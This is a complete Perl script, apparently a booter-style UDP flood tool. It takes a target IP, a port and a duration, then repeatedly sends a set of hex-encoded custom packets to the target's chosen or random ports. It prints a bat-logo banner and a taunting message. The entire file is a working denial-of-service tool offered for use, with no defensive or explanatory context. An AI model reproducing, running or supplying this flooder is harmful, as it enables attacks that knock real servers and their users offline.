#!/usr/bin/perl

use Term::ANSIColor qw(:constants);
    $Term::ANSIColor::AUTORESET = 2;
	
use Socket;
use strict;

my ($ip,$port,$time) = @ARGV;

my ($iaddr,$endtime,$pport);
my @packets = (
	"fd01ff0d2b56b7fce0026b00000000",
	"ff0d2b56b7fce0026b00000000",
	"ff0d2b56b776e1026b3d000000",
	"ff0d2b56b7f0e1026b00000000",
	"ff0d2b56b7eae1026b3a000000",
	"ff0d2b56b75ee2026b00000000",
	"fb000100017877e82cb9ba51baacf8ff23178a1798afab3b79da19decda5ba62f19237d2a8bc797e8a522f6323cb286c41cb60ef724a835c53c8673d45a798f146b0304785471b02ceddffe535cb1393f6d90367b9ab79222f6658aef03da6b38338290ec6684162f522eb815edc94f08c30d7c39c133d163da8396229396c543f37b8c3138953985071cc511c2829f521b4d8e9aeb2f77889ad8efbc5ebc23a1a0218b732fb650382ee5ea53bd36930d776dec51e7f38d161fca459c63d28004f1f370eff72a80875aa8601733c5a877dd5466c66eeb6fc1a9991922e213bd5cccb972476d9b563e969d4e881353ba8d2d35ebc2d51be1ca02a411de982613dcb92cad8ca",
	"fb000100015ae0ae1097dd73c85fd3045374ea49b3bc54e9fe4b01bc7848f7a338153dfee5a0e0fc42f9e0f2e7f46ab80f8a8582318158b3b46e92670e44b1ab821b8be5d67c328f650e093a1cb48eb45dc1d0b9efdcbbad79691668479212c94f1d5ba7d68d3fdef55a3f7c5ba301e20e75861cb326c92ae22266564185dba8f9148b43cb936696535a1c32e648a4b47c90a3d76a4ed902f9766eabaf0fada654d34133c847b252d539c266cd0077a6d2c6641c1d02cf0aea6bfb5581ed470af37409044f9e6f577a3458828ef0deb3c41ff1c6007c07529c2e0ccf8cddd4e85c459fcd831f83dd6a6372542495df93133ede5409b83854a79245020f3b8b1e45b907f331",
	"fa000000",
	"566f",
);

$iaddr = inet_aton("$ip") or die "Cannot resolve hostname $ip\n";
$endtime = time() + ($time ? $time : 100);
socket(flood, PF_INET, SOCK_DGRAM, 17);

print BOLD RED<<EOTEXT;

MMMMMMMMMMMMMMMMMMMMM                              MMMMMMMMMMMMMMMMMMMMM
 `MMMMMMMMMMMMMMMMMMMM           N    N           MMMMMMMMMMMMMMMMMMMM'
   `MMMMMMMMMMMMMMMMMMM          MMMMMM          MMMMMMMMMMMMMMMMMMM'  
     MMMMMMMMMMMMMMMMMMM-_______MMMMMMMM_______-MMMMMMMMMMMMMMMMMMM    
      MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM    
      MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM    
      MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM    
     .MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM.    
    MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM  
                   `MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM'                
                          `MMMMMMMMMMMMMMMMMM'                    
                              `MMMMMMMMMM'                              
                                 MMMMMM                         
                                  MMMM                                  
                                   MM                                  


EOTEXT

print "MemeCFW and The Bat Dropped Yo Shit $ip " . ($port ? $port : "Random") . " Port With Custom Packets" . 
  ($time ? " for $time seconds" : "") . "\n";
print "Stop NULLING With Ctrl-C\n" unless $time;

my @binary_packets = map { pack("H*", $_) } @packets;

for (;time() <= $endtime;) {
  $pport = $port ? $port : int(rand(65500))+1;
  
  foreach my $packet (@binary_packets) {
    send(flood, $packet, 0, pack_sockaddr_in($pport, $iaddr));
  }
}
